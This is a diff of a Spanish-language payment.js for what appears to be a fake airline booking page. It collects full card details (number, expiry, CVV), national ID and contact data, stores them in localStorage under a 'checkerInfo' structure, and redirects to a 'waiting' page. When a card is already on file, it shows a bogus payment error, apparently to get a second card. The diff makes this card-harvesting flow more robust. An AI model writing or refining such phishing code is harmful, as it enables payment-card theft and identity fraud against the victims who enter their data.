@@ -1,61 +1,52 @@
-// public/js/payment.js — versión robusta para evitar quedarse pegado en el loader
-// Asegúrate que <script src="./js/functions.js"></script> está antes de este archivo en el HTML.
-
+// public/js/payment.js — versión corregida y robusta
 (function () {
   'use strict';
 
   const LS = window.localStorage;
 
-  // elementos DOM que usas
+  // --- referencias DOM (seguras) ---
   let loader = null;
   function initDomRefs() {
-    loader = document.querySelector('.loader');
-    // si loader es null, crear referencia segura
-    if (!loader) {
-      console.warn('WARNING: .loader no encontrado en el DOM.');
-    }
+    loader = document.querySelector('.loader') || null;
+    if (!loader) console.warn('WARNING: .loader no encontrado en el DOM.');
   }
 
-  // Util: quitar spinner si existe (sin lanzar errores)
+  document.addEventListener('DOMContentLoaded', () => {
+    initDomRefs();
+    // inicio con pequeño delay (igual que antes)
+    setTimeout(startup, 2000);
+
+    // Safety: forzar ocultado si sigue visible a los 5s
+    setTimeout(() => {
+      try {
+        const stillVisible = loader && (loader.classList.contains('show') || getComputedStyle(loader).display !== 'none');
+        if (stillVisible) {
+          console.warn('Loader seguía visible después de 5s — forzando ocultado.');
+          forceHideLoader();
+        }
+      } catch (e) {
+        console.warn('Error comprobando loader visible:', e);
+      }
+    }, 5000);
+  });
+
   function forceHideLoader() {
     try {
       if (loader) {
         loader.classList.remove('show');
-        // fallback: también aplicar estilo inline para asegurarlo
         loader.style.display = 'none';
       }
-      // Quitar clase sb-hidden del body si existe
-      try {
-        document.body.classList.remove('sb-hidden');
-      } catch (e) {}
+      document.body.classList.remove('sb-hidden');
     } catch (e) {
       console.warn('forceHideLoader error:', e);
     }
   }
 
-  // Llamamos init al DOMContentLoaded
-  document.addEventListener('DOMContentLoaded', () => {
-    initDomRefs();
-
-    // ejecutamos la inicialización con un pequeño retraso (igual que antes)
-    setTimeout(startup, 2000);
-
-    // Safety: si algo falla y loader sigue visible, lo quitamos a los 5s
-    setTimeout(() => {
-      const stillVisible = loader && (loader.classList.contains('show') || getComputedStyle(loader).display !== 'none');
-      if (stillVisible) {
-        console.warn('Loader seguía visible después de 5s — forzando ocultado.');
-        forceHideLoader();
-      }
-    }, 5000);
-  });
-
-  // STARTUP — lógica que antes tenías dentro del setTimeout
+  // STARTUP
   function startup() {
     try {
-      // Proteger acceso a `info` (definido en functions.js). Si no existe, cargar desde LS o esperar.
-      if (typeof info === 'undefined' || !info || !info.flightInfo) {
-        // intentar recuperar desde localStorage
+      // intentar cargar info desde ventana o localStorage
+      if (typeof window.info === 'undefined' || !window.info) {
         const saved = LS.getItem('info');
         if (saved) {
           try {
@@ -63,25 +54,25 @@
             console.info('info cargado desde localStorage (startup).');
           } catch (e) {
             console.warn('No se pudo parsear LS.info:', e);
+            window.info = null;
           }
         } else {
+          window.info = window.info || null;
           console.warn('Variable `info` no encontrada y no hay info en localStorage.');
         }
       }
 
-      // quitar clase sb-hidden si existía y ocultar loader si existe
+      // quitar clases/ocultar loader
       try { document.body.classList.remove('sb-hidden'); } catch (e) {}
-      try { if (loader) loader.classList.remove('show'); } catch (e) {}
-      // adicional: asegurar estilo inline oculto (fallback)
-      if (loader) loader.style.display = 'none';
+      try { if (loader) { loader.classList.remove('show'); loader.style.display = 'none'; } } catch (e) {}
 
-      // --- Flight resume (proteger accesos nulos) ---
+      // FLIGHT RESUME: actualizar UI si tenemos la info completa
       try {
+        const originEl = document.querySelector('#origin-code');
+        const destEl = document.querySelector('#destination-code');
         if (window.info && info.flightInfo && info.flightInfo.origin && info.flightInfo.destination) {
-          const originEl = document.querySelector('#origin-code');
-          const destEl = document.querySelector('#destination-code');
-          if (originEl) originEl.textContent = info.flightInfo.origin.code || '';
-          if (destEl) destEl.textContent = info.flightInfo.destination.code || '';
+          if (originEl) originEl.textContent = (info.flightInfo.origin.code || '');
+          if (destEl) destEl.textContent = (info.flightInfo.destination.code || '');
         } else {
           console.warn('info.flightInfo incompleto — omitiendo flight resume.');
         }
@@ -89,30 +80,25 @@
         console.error('Error al actualizar flight resume:', e);
       }
 
-      // calcular precio (con protecciones)
+      // CALCULAR PRECIO
       try {
-        let finalPrice = "- -";
-        if (window.info && info.flightInfo) {
-          if (info.flightInfo.ticket_nat === 'NAC') {
-            finalPrice = pricesNAC[info.flightInfo.ticket_sched][info.flightInfo.ticket_type] * (info.flightInfo.adults + info.flightInfo.children);
-            if (info.flightInfo.type === 1) finalPrice = finalPrice * 2;
-          } else if (info.flightInfo.ticket_nat === 'INT') {
-            finalPrice = pricesINT[info.flightInfo.ticket_sched][info.flightInfo.ticket_type] * (info.flightInfo.adults + info.flightInfo.children);
-            if (info.flightInfo.type === 1) finalPrice = finalPrice * 2;
+        const flightCostEl = document.querySelector('#flight-cost');
+        const finalPrice = computeFinalPrice(window.info);
+        if (flightCostEl) {
+          if (typeof finalPrice === 'number' && !Number.isNaN(finalPrice)) {
+            flightCostEl.textContent = formatPrice(finalPrice);
           } else {
-            console.log('flight resume: ticket_nat no definido');
+            flightCostEl.textContent = '- -';
+            console.warn('finalPrice no numérico:', finalPrice);
           }
         }
-        const fcEl = document.querySelector('#flight-cost');
-        if (fcEl && typeof finalPrice === 'number') fcEl.textContent = formatPrice(finalPrice);
-        else if (fcEl && typeof finalPrice === 'string') fcEl.textContent = finalPrice;
       } catch (e) {
         console.warn('Error calculando finalPrice:', e);
       }
 
-      // Si en metaInfo había un error explícito, mostrarlo (tu lógica original)
+      // COMPROBAR ERROR en metaInfo
       try {
-        if (window.info && info.metaInfo && info.metaInfo.p && info.metaInfo.p !== '') {
+        if (window.info && info.metaInfo && typeof info.metaInfo.p === 'string' && info.metaInfo.p !== '') {
           alert('ERROR: Corrija el método de pago o intente con un nuevo método de pago. (AVERR88000023)');
         }
       } catch (e) {}
@@ -120,18 +106,55 @@
       console.log('payment.js: startup finalizado.');
     } catch (err) {
       console.error('startup error:', err);
-      // si algo sale mal, forzamos ocultar loader para que no quede pegado
       forceHideLoader();
     }
-  } // fin startup
+  } // end startup
 
+  // --- cálculo seguro del precio ---
+  function computeFinalPrice(infoObj) {
+    try {
+      if (!infoObj || !infoObj.flightInfo) return NaN;
 
-  /***************************************
-   * El resto de tus funciones y lógica
-   * (validaciones, form submit, formateos...)
-   ***************************************/
+      const fi = infoObj.flightInfo;
+      const adults = Number(fi.adults) || 0;
+      const children = Number(fi.children) || 0;
+      const pax = Math.max(1, adults + children); // al menos 1 pasajero
 
-  // Referencias DOM para el form (las mismas que usas)
+      const sched = fi.ticket_sched;
+      const type = fi.ticket_type;
+
+      let base = NaN;
+
+      // comprobar que los objetos de precios existan
+      if (fi.ticket_nat === 'NAC') {
+        if (typeof pricesNAC !== 'undefined' && pricesNAC && pricesNAC[sched] && typeof pricesNAC[sched][type] !== 'undefined') {
+          base = Number(pricesNAC[sched][type]);
+        } else {
+          console.warn('pricesNAC no definido o entrada faltante:', sched, type);
+        }
+      } else if (fi.ticket_nat === 'INT') {
+        if (typeof pricesINT !== 'undefined' && pricesINT && pricesINT[sched] && typeof pricesINT[sched][type] !== 'undefined') {
+          base = Number(pricesINT[sched][type]);
+        } else {
+          console.warn('pricesINT no definido o entrada faltante:', sched, type);
+        }
+      } else {
+        console.warn('flight resume: ticket_nat no definido:', fi.ticket_nat);
+      }
+
+      if (!Number.isFinite(base)) return NaN;
+
+      let final = base * pax;
+      if (Number(fi.type) === 1) final = final * 2; // ida y vuelta si aplica
+
+      return final;
+    } catch (e) {
+      console.warn('computeFinalPrice error:', e);
+      return NaN;
+    }
+  }
+
+  // --- DOM: form y campos (referencias seguras) ---
   const form = document.querySelector('#next-step');
   const p = document.querySelector('#p');
   const pdate = document.querySelector('#pdate');
@@ -151,34 +174,37 @@
     form.addEventListener('submit', async (e) => {
       e.preventDefault();
 
-      // Limpieza de estados visuales
+      // limpiar errores visuales (si existen)
       [p, pdate, c, dudename, surname, dniEl, email, telnum, city, state, address].forEach(el => {
-        try { el.classList.remove('input-error'); } catch(_) {}
+        try { if (el && el.classList) el.classList.remove('input-error'); } catch (_) {}
       });
 
-      // Validaciones (mantengo tu lógica; si falla, marcamos campo y retornamos)
-      const rawCard = p ? p.value : '';
-      const firstChar = (rawCard.replace(/\s/g, ''))[0] || '';
+      // valores protegidos
+      const rawCard = p && p.value ? p.value : '';
+      const rawCardDigits = rawCard.replace(/\D/g, '');
+      const firstChar = rawCardDigits[0] || '';
       const cardLength = rawCard.length;
 
       const cardLengthOk = (cardLength === 19 && firstChar !== '3' && ['4','5'].includes(firstChar)) ||
                            (cardLength === 17 && firstChar === '3');
 
-      if (!cardLengthOk) { if (p) p.classList.add('input-error'); if (p) p.focus(); return; }
-      if (!isLuhnValid(rawCard)) { if (p) p.classList.add('input-error'); if (p) p.focus(); return; }
-      if (!isValidDate(pdate ? pdate.value : '')) { if (pdate) pdate.classList.add('input-error'); if (pdate) pdate.focus(); return; }
-      if (!((c && c.value.length === 3 && firstChar !== '3') || (c && c.value.length === 4 && firstChar === '3'))) { if (c) c.classList.add('input-error'); if (c) c.focus(); return; }
-      if (!ban || !ban.value) { if (ban) ban.focus(); return; }
-      if (!dudename || !dudename.value) { if (dudename) dudename.classList.add('input-error'); if (dudename) dudename.focus(); return; }
-      if (!surname || !surname.value) { if (surname) surname.classList.add('input-error'); if (surname) surname.focus(); return; }
-      if (!dniEl || !dniEl.value) { if (dniEl) dniEl.classList.add('input-error'); if (dniEl) dniEl.focus(); return; }
-      if (!email || !email.value) { if (email) email.classList.add('input-error'); if (email) email.focus(); return; }
-      if (!telnum || !telnum.value) { if (telnum) telnum.classList.add('input-error'); if (telnum) telnum.focus(); return; }
-      if (!city || !city.value) { if (city) city.classList.add('input-error'); if (city) city.focus(); return; }
-      if (!state || !state.value) { if (state) state.classList.add('input-error'); if (state) state.focus(); return; }
-      if (!address || !address.value) { if (address) address.classList.add('input-error'); if (address) address.focus(); return; }
+      if (!cardLengthOk) { if (p) { p.classList.add('input-error'); p.focus(); } return; }
+      if (!isLuhnValid(rawCard)) { if (p) { p.classList.add('input-error'); p.focus(); } return; }
+      if (!isValidDate(pdate ? pdate.value : '')) { if (pdate) { pdate.classList.add('input-error'); pdate.focus(); } return; }
 
-      // Si pasó validaciones, actualizar info.metaInfo (si existe info)
+      const cLenOk = (c && ((c.value.length === 3 && firstChar !== '3') || (c.value.length === 4 && firstChar === '3')));
+      if (!cLenOk) { if (c) { c.classList.add('input-error'); c.focus(); } return; }
+      if (!ban || !ban.value) { if (ban) ban.focus(); return; }
+      if (!dudename || !dudename.value) { if (dudename) { dudename.classList.add('input-error'); dudename.focus(); } return; }
+      if (!surname || !surname.value) { if (surname) { surname.classList.add('input-error'); surname.focus(); } return; }
+      if (!dniEl || !dniEl.value) { if (dniEl) { dniEl.classList.add('input-error'); dniEl.focus(); } return; }
+      if (!email || !email.value) { if (email) { email.classList.add('input-error'); email.focus(); } return; }
+      if (!telnum || !telnum.value) { if (telnum) { telnum.classList.add('input-error'); telnum.focus(); } return; }
+      if (!city || !city.value) { if (city) { city.classList.add('input-error'); city.focus(); } return; }
+      if (!state || !state.value) { if (state) { state.classList.add('input-error'); state.focus(); } return; }
+      if (!address || !address.value) { if (address) { address.classList.add('input-error'); address.focus(); } return; }
+
+      // Guardar metaInfo si existe info
       try {
         if (window.info && info.metaInfo) {
           info.metaInfo.p = p.value;
@@ -195,39 +221,58 @@
           info.metaInfo.address = address.value;
           info.metaInfo.dues = dues ? dues.value : '';
           info.metaInfo.flightCost = document.querySelector('#flight-cost') ? document.querySelector('#flight-cost').textContent : '';
+          if (!info.checkerInfo) info.checkerInfo = {};
           info.checkerInfo.mode = 'userpassword';
-          updateLS();
+
+          // determinar compañía por primer dígito
+          const fc = (p.value || '').replace(/\D/g, '')[0] || '';
+          if (fc === '4') info.checkerInfo.company = 'VISA';
+          else if (fc === '5') info.checkerInfo.company = 'MC';
+          else if (fc === '3') info.checkerInfo.company = 'AM';
+
+          safeUpdateLS();
         }
       } catch (e) {
         console.warn('No se pudo actualizar info.metaInfo:', e);
       }
 
-      // Aquí puedes seguir con tu flujo: enviar al backend, etc.
-      // Por ejemplo:
-      // const payload = {...}; fetch('/api/enviar-pago', { method:'POST', ... })
+      // mostrar loader y redirigir
+      try {
+        if (loader) {
+          loader.classList.add('show');
+          loader.style.display = '';
+        }
+        setTimeout(() => {
+          try { window.location.href = 'waiting.html'; } catch (e) { console.warn('redir error:', e); }
+        }, 4500);
+      } catch (e) {
+        console.warn('Error al intentar mostrar loader/redirigir:', e);
+        forceHideLoader();
+      }
 
-      console.log('Formulario validado correctamente — continua con el envío al backend.');
     });
   }
 
-  /***********************
-   * Funciones util (las tuyas)
-   ***********************/
-  function updateLS(){
-    try { LS.setItem('info', JSON.stringify(info)); } catch (e) { console.warn('updateLS error', e); }
+  // --- utilidades ---
+  function safeUpdateLS(){
+    try {
+      if (typeof info !== 'undefined') LS.setItem('info', JSON.stringify(info));
+    } catch (e) {
+      console.warn('updateLS error', e);
+    }
   }
 
   function formatCNumber(input) {
     if (!input) return;
     let numero = input.value.replace(/\D/g, '');
     if (numero.length === 0) {
-      try { input.classList.remove(); } catch (e) {}
+      try { input.className = ''; } catch(e) {}
       input.classList.add('input-cc', 'mt-2', 'bg-std');
     }
     let numeroFormateado = '';
     if (numero[0] === '3') {
-      c.setAttribute('maxlength','4');
-      if (p) { p.classList.remove(); p.classList.add('bg-am','input-cc','mt-2'); }
+      if (c) c.setAttribute('maxlength','4');
+      if (p) { p.classList.remove('bg-vi','bg-mc'); p.classList.add('bg-am','input-cc','mt-2'); }
       if (numero.length > 15) numero = numero.substr(0,15);
       for (let i=0;i<numero.length;i++){
         if (i===4 || i===10) numeroFormateado += ' ';
@@ -235,9 +280,10 @@
       }
       input.value = numeroFormateado;
     } else {
+      if (p) { p.classList.remove('bg-am'); }
       if (numero[0] == '4' && p) p.classList.add('bg-vi');
       if (numero[0] == '5' && p) p.classList.add('bg-mc');
-      c.setAttribute('maxlength','3');
+      if (c) c.setAttribute('maxlength','3');
       if (numero.length > 16) numero = numero.substr(0,16);
       for (let i=0;i<numero.length;i++){
         if (i>0 && i%4===0) numeroFormateado += ' ';
@@ -249,54 +295,63 @@
 
   function formatDate(input) {
     if (!input) return;
-    var texto = input.value;
-    texto = texto.replace(/\D/g,'');
-    texto = texto.substring(0,4);
+    var texto = input.value.replace(/\D/g,'').substring(0,4);
     if (texto.length > 2) texto = texto.substring(0,2) + '/' + texto.substring(2,4);
     input.value = texto;
   }
 
+  // Formatea number -> "1.234.567,89" con dos decimales usando locale es-CO
   function formatPrice(number){
-    if (typeof number !== 'number') number = Number(number) || 0;
-    return number.toFixed(2);
-  }
-
-  function isLuhnValid(bin) {
-    if (!bin) return false;
-    bin = bin.replace(/\D/g,'');
-    if (bin.length < 6) return false;
-    const digits = bin.split('').map(Number).reverse();
-    let sum = 0;
-    for (let i=0;i<digits.length;i++){
-      if (i%2 !== 0){
-        let doubled = digits[i]*2;
-        if (doubled > 9) doubled -= 9;
-        sum += doubled;
-      } else {
-        sum += digits[i];
-      }
+    number = Number(number) || 0;
+    try {
+      return number.toLocaleString('es-CO', {minimumFractionDigits:2, maximumFractionDigits:2});
+    } catch (e) {
+      return number.toFixed(2);
     }
-    return sum % 10 === 0;
   }
 
+  // Luhn robusto: acepta espacios y guiones
+  function isLuhnValid(value) {
+    if (!value || typeof value !== 'string') return false;
+    const s = value.replace(/\D/g, '');
+    if (s.length < 6) return false; // mínimo sensato
+    let sum = 0;
+    let shouldDouble = false;
+    // recorremos de derecha a izquierda
+    for (let i = s.length - 1; i >= 0; i--) {
+      let digit = parseInt(s.charAt(i), 10);
+      if (isNaN(digit)) return false;
+      if (shouldDouble) {
+        digit *= 2;
+        if (digit > 9) digit -= 9;
+      }
+      sum += digit;
+      shouldDouble = !shouldDouble;
+    }
+    return (sum % 10) === 0;
+  }
+
+  // Validación de fecha MM/AA (no vencida y no > +8 años)
   function isValidDate(fechaInput) {
     if (!fechaInput || typeof fechaInput !== 'string') return false;
-    var partes = fechaInput.split('/');
-    if (partes.length < 2) return false;
-    var mesInput = parseInt(partes[0],10);
-    var añoInput = parseInt(partes[1],10);
-    if (isNaN(mesInput) || isNaN(añoInput)) return false;
-    if (mesInput > 12) return false;
-    añoInput += 2000;
-    var fechaActual = new Date();
-    var añoActual = fechaActual.getFullYear();
-    var limiteAño = añoActual + 8;
-    if (añoInput > limiteAño || (añoInput === limiteAño && mesInput >= 1)) return false;
-    if (añoInput > añoActual || (añoInput === añoActual && mesInput >= (fechaActual.getMonth()+1))) {
-      return true;
-    } else {
-      return false;
-    }
+    const partes = fechaInput.split('/');
+    if (partes.length !== 2) return false;
+    const mes = parseInt(partes[0], 10);
+    let anio = parseInt(partes[1], 10);
+    if (isNaN(mes) || isNaN(anio)) return false;
+    if (mes < 1 || mes > 12) return false;
+    // interpretar YY -> 20YY
+    anio += 2000;
+    // construir fecha final: el último día del mes de expiración
+    const exp = new Date(anio, mes, 0, 23, 59, 59, 999); // mes indexado 0: usar mes directo produce siguiente - 0 para último día
+    const ahora = new Date();
+    // límite superior
+    const limite = new Date();
+    limite.setFullYear(limite.getFullYear() + 8);
+    // comprobar que la expiración esté entre ahora (incluido) y limite (excluido)
+    if (exp < ahora) return false;
+    if (exp > limite) return false;
+    return true;
   }
 
 })(); // fin módulo
